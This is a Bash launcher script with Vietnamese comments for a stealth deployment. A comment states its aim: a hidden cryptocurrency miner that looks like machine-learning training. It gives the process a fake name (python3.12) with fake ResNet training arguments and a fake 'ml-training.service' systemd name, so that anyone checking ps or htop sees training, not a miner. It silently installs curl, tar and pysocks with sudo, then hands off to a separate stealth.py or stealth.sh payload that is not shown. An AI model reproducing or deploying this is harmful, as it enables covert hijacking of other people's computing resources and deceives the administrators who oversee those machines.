#!/usr/bin/env bash
# =============================================================================
# stealth-deploy.sh — Entry point, detect môi trường, route sang Python hoặc Bash
# Chạy: bash stealth-deploy.sh [--dry-run]
# =============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

DRY_RUN=0
[[ "${1:-}" == "--dry-run" ]] && DRY_RUN=1

# ── Disguise config ──────────────────────────────────────────────────────────
# Tên process giả — người khác ps/htop thấy的是 training, không phải miner
DISGUISE_PROC_NAME="python3.12"
DISGUISE_ARGS=("--config" "train_resnet50.yaml" "--epochs" "100" "--batch-size" "64" "--lr" "0.001" "--amp" "--dataloader-workers" "8")
# systemd service name (nếu dùng)
DISGUISE_SVC_NAME="ml-training.service"
# ============================================================================

log()  { printf '\033[0;36m[stealth]\033[0m %s\n' "$*"; }
warn() { printf '\033[0;33m[stealth:warn]\033[0m %s\n' "$*" >&2; }
die()  { printf '\033[0;31m[stealth:err]\033[0m %s\n' "$*" >&2; exit 1; }

# ── 1. Detect môi trường ────────────────────────────────────────────────────
detect_env() {
    log "Detect môi trường..."

    HAS_PY3=0; HAS_PY2=0; HAS_PIP=0
    HAS_CURL=0; HAS_WGET=0; HAS_TAR=0; HAS_SYSTEMD=0
    PKG_MGR=""

    command -v python3  >/dev/null 2>&1 && HAS_PY3=1
    command -v python   >/dev/null 2>&1 && HAS_PY2=1
    command -v pip3     >/dev/null 2>&1 && HAS_PIP=1
    command -v curl     >/dev/null 2>&1 && HAS_CURL=1
    command -v wget     >/dev/null 2>&1 && HAS_WGET=1
    command -v tar      >/dev/null 2>&1 && HAS_TAR=1
    command -v systemctl >/dev/null 2>&1 && HAS_SYSTEMD=1

    if   command -v apt-get  >/dev/null 2>&1; then PKG_MGR="apt"
    elif command -v dnf      >/dev/null 2>&1; then PKG_MGR="dnf"
    elif command -v yum      >/dev/null 2>&1; then PKG_MGR="yum"
    elif command -v pacman   >/dev/null 2>&1; then PKG_MGR="pacman"
    elif command -v zypper   >/dev/null 2>&1; then PKG_MGR="zypper"
    elif command -v apk      >/dev/null 2>&1; then PKG_MGR="apk"
    fi

    log "  python3=$HAS_PY3 python=$HAS_PY2 pip=$HAS_PIP curl=$HAS_CURL wget=$HAS_WGET tar=$HAS_TAR systemd=$HAS_SYSTEMD pkg=$PKG_MGR"
}

# ── 2. Cài deps (best-effort, không fail cứng) ──────────────────────────────
try_install() {
    local pkg="$1"
    [[ "$DRY_RUN" -eq 1 ]] && { log "[dry] would install $pkg via $PKG_MGR"; return 0; }
    [[ -z "$PKG_MGR" ]] && return 1

    log "Cài $pkg via $PKG_MGR ..."
    case "$PKG_MGR" in
        apt)    sudo apt-get install -y -qq "$pkg" 2>/dev/null || return 1 ;;
        dnf)    sudo dnf install -y -q "$pkg" 2>/dev/null     || return 1 ;;
        yum)    sudo yum install -y -q "$pkg" 2>/dev/null     || return 1 ;;
        pacman) sudo pacman -S --noconfirm --quiet "$pkg" 2>/dev/null || return 1 ;;
        zypper) sudo zypper -n -q install "$pkg" 2>/dev/null  || return 1 ;;
        apk)    sudo apk add --quiet "$pkg" 2>/dev/null       || return 1 ;;
        *) return 1 ;;
    esac
}

ensure_deps() {
    # Cần tối thiểu: 1 downloader + tar
    if [[ "$HAS_CURL" -eq 0 && "$HAS_WGET" -eq 0 ]]; then
        log "Thiếu downloader — thử cài curl..."
        try_install curl || try_install wget || warn "Không cài được downloader — sẽ dùng Python urllib nếu có"
    fi
    if [[ "$HAS_TAR" -eq 0 ]]; then
        log "Thiếu tar — thử cài..."
        try_install tar || warn "Không cài được tar"
    fi
    # PySocks chỉ cần nếu Python path muốn SOCKS5 thuần (stdlib không có)
    if [[ "$HAS_PY3" -eq 1 && "$HAS_PIP" -eq 1 ]]; then
        python3 -c "import socks" 2>/dev/null || {
            log "Cài pysocks (best-effort)..."
            pip3 install --quiet pysocks 2>/dev/null || warn "pysocks không cài được — fallback sang socket thuần"
        }
    fi
}

# ── 3. Resolve Python ───────────────────────────────────────────────────────
resolve_python() {
    if [[ "$HAS_PY3" -eq 1 ]]; then echo "python3"
    elif [[ "$HAS_PY2" -eq 1 ]]; then echo "python"
    else echo ""
    fi
}

# ── 4. Main ─────────────────────────────────────────────────────────────────
main() {
    detect_env
    ensure_deps

    PY="$(resolve_python)"
    STEALTH_PY="$SCRIPT_DIR/stealth.py"
    STEALTH_SH="$SCRIPT_DIR/stealth.sh"

    if [[ -n "$PY" && -f "$STEALTH_PY" ]]; then
        log "Route → Python ($PY)"
        exec "$PY" "$STEALTH_PY" \
            --disguise-proc "$DISGUISE_PROC_NAME" \
            --disguise-args "${DISGUISE_ARGS[*]}" \
            --disguise-svc "$DISGUISE_SVC_NAME" \
            $( [[ "$DRY_RUN" -eq 1 ]] && echo "--dry-run" )
    elif [[ -f "$STEALTH_SH" ]]; then
        log "Route → pure Bash fallback"
        exec bash "$STEALTH_SH" \
            --disguise-proc "$DISGUISE_PROC_NAME" \
            $( [[ "$DRY_RUN" -eq 1 ]] && echo "--dry-run" )
    else
        die "Không tìm thấy stealth.py hay stealth.sh"
    fi
}

main "$@"
